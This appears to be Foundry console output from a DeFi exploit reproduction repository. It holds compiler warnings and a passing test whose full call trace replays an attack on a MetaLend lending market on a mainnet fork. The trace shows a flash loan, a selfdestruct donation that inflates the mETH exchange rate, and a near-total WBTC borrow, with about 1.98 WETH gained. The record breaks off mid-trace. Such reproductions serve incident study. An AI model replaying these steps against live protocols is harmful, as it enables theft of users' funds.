Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.35s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-11/MetaLend_exp.sol:24:5:
   |
24 |     IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
   --> src/test/2023-11/MetaLend_exp.sol:110:9:
    |
110 |         selfdestruct(payable(to));
    |         ^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2023-11/MetaLend_exp.sol:49:9:
   |
49 |         address asset,
   |         ^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2023-11/MetaLend_exp.sol:51:9:
   |
51 |         uint256 premium,
   |         ^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2023-11/MetaLend_exp.sol:52:9:
   |
52 |         address initiator,
   |         ^^^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2023-11/MetaLend_exp.sol:53:9:
   |
53 |         bytes calldata params
   |         ^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 565.63ms (1.79ms CPU time)

Ran 1 test for src/test/2023-11/MetaLend_exp.sol:MetaLendExploit
[PASS] testExploit() (gas: 5112724)
Logs:
  Exploiter WETH balance before attack: 0.000000000000000000
  Exploiter WETH balance after attack: 1.984144102321156164

Traces:
  [7141] MetaLendExploit::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 18648753 [1.864e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(Spark: [0xC13e21B648A5Ee794902342038FF3aDAB66BE987], "Spark")
    │   └─ ← [Return]
    ├─ [0] VM::label(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "Router")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], "WBTC")
    │   └─ ← [Return]
    ├─ [0] VM::label(Comptroller: [0x0ee4b2C533ED3fFbd9f04CD7E812A4041bbE89f6], "Comptroller")
    │   └─ ← [Return]
    └─ ← [Stop]

  [5209124] MetaLendExploit::testExploit()
    ├─ [0] VM::deal(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ [2534] WETH::balanceOf(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
    ├─ [5189005] Spark::flashLoanSimple(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 100000000000000000000 [1e20], 0x, 0)
    │   ├─ [5183961] 0x8115366Ca7Cf280a760f0bC0F6Db3026e2437115::flashLoanSimple(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 100000000000000000000 [1e20], 0x, 0) [delegatecall]
    │   │   ├─ [5177316] 0xCb0e499954aE4277d0dB0E13A938b73745eBE9bA::a1fe0e8d(f81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ebf00000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [35946] 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB::transferUnderlyingTo(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
    │   │   │   │   ├─ [30926] 0x6175ddEc3B9b38c88157C10A01ed4A3fa8639cC6::transferUnderlyingTo(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20]) [delegatecall]
    │   │   │   │   │   ├─ [27962] WETH::transfer(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB, to: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000000 [1e20])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0x6c1eef25cf25dfa855df343339785be25ba773ed63c1ca0fbca263e6a490daca: 0x000000000000000000000000000000000000000000000735dd3d83c01451a486 → 0x00000000000000000000000000000000000000000000073071762592b141a486
    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [5045000] MetaLendExploit::executeOperation(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 100000000000000000000 [1e20], 0, MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [534] WETH::balanceOf(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   ├─ [9195] WETH::withdraw(100000000000000000000 [1e20])
    │   │   │   │   │   ├─ [55] MetaLendExploit::receive{value: 100000000000000000000}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ emit Withdrawal(src: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 100000000000000000000 [1e20])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [2897483] → new Helper@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 31: 0 → 1
    │   │   │   │   │   │   @ 12: 0 → 1
    │   │   │   │   │   └─ ← [Return] 14250 bytes of code
    │   │   │   │   ├─ [1948229] Helper::donateAndBorrow()
    │   │   │   │   │   ├─ [124630] 0x5578f2E245e932a599c46215a0cA88707230F17B::mint{value: 1000000000000000000}()
    │   │   │   │   │   │   ├─ [4971] 0x0Dff0a338D8166338478FD330c8d374D525afA8c::getBorrowRate(0, 0, 0) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000023703e87b
    │   │   │   │   │   │   ├─ emit AccrueInterest(cashPrior: 0, interestAccumulated: 0, borrowIndex: 1042981725108110032 [1.042e18], totalBorrows: 0)
    │   │   │   │   │   │   ├─ [29408] Comptroller::mintAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
    │   │   │   │   │   │   │   ├─ [24240] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::mintAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [2530] 0x5578f2E245e932a599c46215a0cA88707230F17B::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: 0x5578f2E245e932a599c46215a0cA88707230F17B, param1: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0, param3: 0)
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0x69809147f2e6cc7e3b65720d159f9e6762db36394dac802c372770ce40f3ea5a: 0x00e1488f00000000000000000000000000000000000000000000000000000000 → 0x011c8eb100000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ emit Mint(minter: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], mintAmount: 1000000000000000000 [1e18], mintTokens: 5000000000 [5e9])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x5578f2E245e932a599c46215a0cA88707230F17B, to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 5000000000 [5e9])
    │   │   │   │   │   │   ├─ [1004] Comptroller::mintVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18], 5000000000 [5e9])
    │   │   │   │   │   │   │   ├─ [403] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::mintVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18], 5000000000 [5e9]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 13: 0 → 0x000000000000000000000000000000000000000000000000000000012a05f200
    │   │   │   │   │   │   │   @ 0x03e4c9e74b1c7b5bc291bbceddb1959bc654bc89eb9c1f11f6da9a1eeb9b4074: 0 → 0x000000000000000000000000000000000000000000000000000000012a05f200
    │   │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000000000000000000000000000000000e1488f → 0x00000000000000000000000000000000000000000000000000000000011c8eb1
    │   │   │   │   │   │   │   @ 10: 0x0000000000000000000000000000000000000000000000000df55dbd347c6249 → 0x0000000000000000000000000000000000000000000000000e796a5a604b02d0
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [367] 0x5578f2E245e932a599c46215a0cA88707230F17B::totalSupply() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 5000000000 [5e9]
    │   │   │   │   │   ├─ [31138] 0x5578f2E245e932a599c46215a0cA88707230F17B::redeem(4999999998 [4.999e9])
    │   │   │   │   │   │   ├─ [9895] Comptroller::redeemAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 4999999998 [4.999e9])
    │   │   │   │   │   │   │   ├─ [9217] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::redeemAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 4999999998 [4.999e9]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [530] 0x5578f2E245e932a599c46215a0cA88707230F17B::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000 [5e9]
    │   │   │   │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: 0x5578f2E245e932a599c46215a0cA88707230F17B, param1: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0, param3: 0)
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [55] Helper::receive{value: 999999999600000000}()
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x5578f2E245e932a599c46215a0cA88707230F17B, value: 4999999998 [4.999e9])
    │   │   │   │   │   │   ├─ emit Redeem(redeemer: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], redeemAmount: 999999999600000000 [9.999e17], redeemTokens: 4999999998 [4.999e9])
    │   │   │   │   │   │   ├─ [1047] Comptroller::redeemVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999600000000 [9.999e17], 4999999998 [4.999e9])
    │   │   │   │   │   │   │   ├─ [446] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::redeemVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999600000000 [9.999e17], 4999999998 [4.999e9]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 13: 0x000000000000000000000000000000000000000000000000000000012a05f200 → 2
    │   │   │   │   │   │   │   @ 0x03e4c9e74b1c7b5bc291bbceddb1959bc654bc89eb9c1f11f6da9a1eeb9b4074: 0x000000000000000000000000000000000000000000000000000000012a05f200 → 2
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [1189717] → new Donator@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 31: 0 → 1
    │   │   │   │   │   │   │   @ 12: 0 → 1
    │   │   │   │   │   │   └─ ← [Return] 5721 bytes of code
    │   │   │   │   │   ├─ [5446] Donator::sendETHTo{value: 99999999999600000000}(0x5578f2E245e932a599c46215a0cA88707230F17B)
    │   │   │   │   │   │   └─ ← [SelfDestruct]
    │   │   │   │   │   ├─ [70685] Comptroller::enterMarkets([0x5578f2E245e932a599c46215a0cA88707230F17B])
    │   │   │   │   │   │   ├─ [69996] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::enterMarkets([0x5578f2E245e932a599c46215a0cA88707230F17B]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit MarketEntered(rToken: 0x5578f2E245e932a599c46215a0cA88707230F17B, account: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0xdd0bf5b181a083a8fd78173fded2004ae2775a087cce8736e5c04fc412f477d4: 0 → 1
    │   │   │   │   │   │   │   │   @ 0xd5ce871ae9021201bef81f6d37c125fcdeccbd336ebd825239acea6f95005c69: 0 → 1
    │   │   │   │   │   │   │   │   @ 0xd3863bedc6d225d141e92468f51d030ff6a6e9285739882a6e1fd970aff0b521: 0 → 0x0000000000000000000000005578f2e245e932a599c46215a0ca88707230f17b
    │   │   │   │   │   │   │   └─ ← [Return] [0]
    │   │   │   │   │   │   └─ ← [Return] [0]
    │   │   │   │   │   ├─ [15523] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::getCash() [staticcall]
    │   │   │   │   │   │   ├─ [14232] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::delegateToImplementation(0x3b1d21a2) [staticcall]
    │   │   │   │   │   │   │   ├─ [8176] 0x5A3b0BAF4532d7e50D7f6a94b0F152B68153B791::getCash() [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [2795] WBTC::balanceOf(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000a7d8c0
    │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   ├─ [340349] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::borrow(10999999 [1.099e7])
    │   │   │   │   │   │   ├─ [339534] 0x5A3b0BAF4532d7e50D7f6a94b0F152B68153B791::borrow(10999999 [1.099e7]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   │   │   ├─ [4971] 0xD1AbbAb2a5229CE8BFB573Ce4062058a67a1df95::getBorrowRate(11000000 [1.1e7], 0, 0) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000023703e87b
    │   │   │   │   │   │   │   ├─ emit AccrueInterest(cashPrior: 11000000 [1.1e7], interestAccumulated: 0, borrowIndex: 1042781866300695303 [1.042e18], totalBorrows: 0)
    │   │   │   │   │   │   │   ├─ [197957] Comptroller::borrowAllowed(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10999999 [1.099e7])
    │   │   │   │   │   │   │   │   ├─ [197289] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::borrowAllowed(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10999999 [1.099e7]) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ emit MarketEntered(rToken: 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, account: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   │   │   │   │   │   ├─ [32802] 0xd0AF1C29E842B94490a78797342e3654E7833Bf4::getUnderlyingPrice(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [3053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   │   ├─ [1053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   │   ├─ [15735] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7502] 0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8054, 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 8054
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 110680464442257317750 [1.106e20], 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 110680464442257317750 [1.106e20]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 376486600000000000000000000000000 [3.764e32]
    │   │   │   │   │   │   │   │   │   ├─ [4739] 0x5578f2E245e932a599c46215a0cA88707230F17B::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 2, 0, 50000000000000000000000000000000000000 [5e37]
    │   │   │   │   │   │   │   │   │   ├─ [28736] 0xd0AF1C29E842B94490a78797342e3654E7833Bf4::getUnderlyingPrice(0x5578f2E245e932a599c46215a0cA88707230F17B) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [3054] 0x5578f2E245e932a599c46215a0cA88707230F17B::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mETH"
    │   │   │   │   │   │   │   │   │   │   ├─ [1054] 0x5578f2E245e932a599c46215a0cA88707230F17B::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mETH"
    │   │   │   │   │   │   │   │   │   │   ├─ [15735] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7502] 0xE62B71cf983019BFf55bC83B48601ce8419650CC::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8221, 207100000000 [2.071e11], 1700913347 [1.7e9], 1700913347 [1.7e9], 8221
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 110680464442257317917 [1.106e20], 207100000000 [2.071e11], 1700913347 [1.7e9], 1700913347 [1.7e9], 110680464442257317917 [1.106e20]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2071000000000000000000 [2.071e21]
    │   │   │   │   │   │   │   │   │   ├─ [13283] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [11814] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::delegateToImplementation(0xc37f68e20000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [9945] 0x5A3b0BAF4532d7e50D7f6a94b0F152B68153B791::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 20000000000000000 [2e16]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000470de4df820000
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 20000000000000000 [2e16]
    │   │   │   │   │   │   │   │   │   ├─ [11802] 0xd0AF1C29E842B94490a78797342e3654E7833Bf4::getUnderlyingPrice(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [1053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   │   ├─ [1053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   │   ├─ [3235] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [1502] 0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8054, 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 8054
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 110680464442257317750 [1.106e20], 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 110680464442257317750 [1.106e20]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 376486600000000000000000000000000 [3.764e32]
    │   │   │   │   │   │   │   │   │   ├─ [410] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::borrowIndex() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1042781866300695303 [1.042e18]
    │   │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   │   @ 0xd5ce871ae9021201bef81f6d37c125fcdeccbd336ebd825239acea6f95005c69: 1 → 2
    │   │   │   │   │   │   │   │   │   │   @ 0xd3863bedc6d225d141e92468f51d030ff6a6e9285739882a6e1fd970aff0b522: 0 → 0x0000000000000000000000000d8df79195ec37c6cd53036f9f8ee0c24b23601e
    │   │   │   │   │   │   │   │   │   │   @ 0x51f780e6c8904f7cae16322e64b771aea6d6673b84309edcacbc10e7c191ce14: 0 → 1
